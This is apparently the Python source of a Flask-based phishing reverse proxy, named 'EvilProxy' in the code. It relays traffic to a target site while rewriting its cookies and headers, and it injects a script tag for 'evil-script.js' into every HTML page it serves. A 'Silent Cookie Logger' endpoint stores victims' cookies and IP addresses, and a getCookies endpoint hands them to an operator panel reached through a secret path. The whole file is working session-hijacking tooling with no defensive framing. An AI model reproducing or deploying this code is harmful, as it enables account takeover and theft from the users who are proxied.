from flask import Flask, request, Response, send_from_directory, jsonify
import requests, re, json, os
import brotli
from datetime import datetime

if not os.path.exists('cookies.json'):
    with open('cookies.json', 'w') as f:
        json.dump([], f)

def start_proxy(target, host, port, secret):
    app = Flask(__name__)

    @app.route(f'/{secret}')
    def panel_index():
        return send_from_directory('panel', 'index.html')

    @app.route(f'/ep/assets/EvilProxyBanner.png')
    def panel_banner():
        return send_from_directory('panel', 'EvilProxyBanner.png')

    @app.route('/evil-script.js')
    def payload():
        return send_from_directory('.', 'evil-script.js')

    # API:
    @app.route('/ep/api/ping', methods=['POST']) # Silent Cookie Logger
    def eat_cookie():
        cookies = request.cookies
        user_ip = request.remote_addr
        timestamp = datetime.now().isoformat()

        cookie_data = []
        for key, value in cookies.items():
            cookie_data.append({
                'name': key,
                'value': value,
                'timestamp': timestamp,
                'ip': user_ip
            })

        with open('cookies.json', 'r') as f:
            existing_cookies = json.load(f)

        existing_cookies.extend(cookie_data)

        with open('cookies.json', 'w') as f:
            json.dump(existing_cookies, f)

        return jsonify({'message': 'Pong!'}), 200

    @app.route('/ep/api/getCookies', methods=['GET'])
    def get_cookies():
        with open('cookies.json', 'r') as f:
            cookies = json.load(f)

        response_data = []
        for cookie in cookies:
            logged_time = datetime.fromisoformat(cookie['timestamp'])
            time_diff = datetime.now() - logged_time
            seconds_ago = time_diff.total_seconds()
            
            if seconds_ago < 60:
                time_str = f'Logged: {int(seconds_ago)} seconds ago'
            elif seconds_ago < 3600:
                time_str = f'Logged: {int(seconds_ago // 60)} minutes ago'
            else:
                time_str = f'Logged: {int(seconds_ago // 3600)} hours ago'

            response_data.append({
                'name': cookie['name'],
                'value': cookie['value'],
                'timestamp': time_str
            })

        return jsonify(response_data), 200

    # Main:
    @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
    @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
    def proxy(path):
        target_url = f"https://{target}/{path}"

        headers = {key: value for key, value in request.headers if key.lower() != 'host'}
        headers['Host'] = target

        if 'Cookie' in request.headers:
            cookies = request.headers['Cookie'].replace(host, target)
            headers['Cookie'] = cookies

        resp = requests.request(
            request.method,
            target_url,
            headers=headers,
            params=request.args,
            data=request.form,
            allow_redirects=False
        )

        response_headers = {key: value for key, value in resp.headers.items() if key.lower() not in ['content-encoding', 'transfer-encoding', 'date', 'server', 'connection']}

        # Brotli Encoding Handler
        resp_content = resp.content
        if 'content-encoding' in resp.headers and 'br' in resp.headers['content-encoding']:
            try:
                resp_content = brotli.decompress(resp.content)
            except brotli.error as e:
                pass  # Likely a non-brotli encoded response

        # Payload Injection
        if 'content-type' in resp.headers and 'text/html' in resp.headers['content-type']:
            resp_content = resp_content.decode('utf-8')
            resp_content = re.sub(r'<head>', r'<head><script src="/evil-script.js"></script>', resp_content)
            resp_content = resp_content.encode('utf-8')

        for key in response_headers:
            response_headers[key] = response_headers[key].replace(target, host)

        return Response(resp_content, status=resp.status_code, headers=response_headers)

    app.run(host=host, port=port, threaded=True)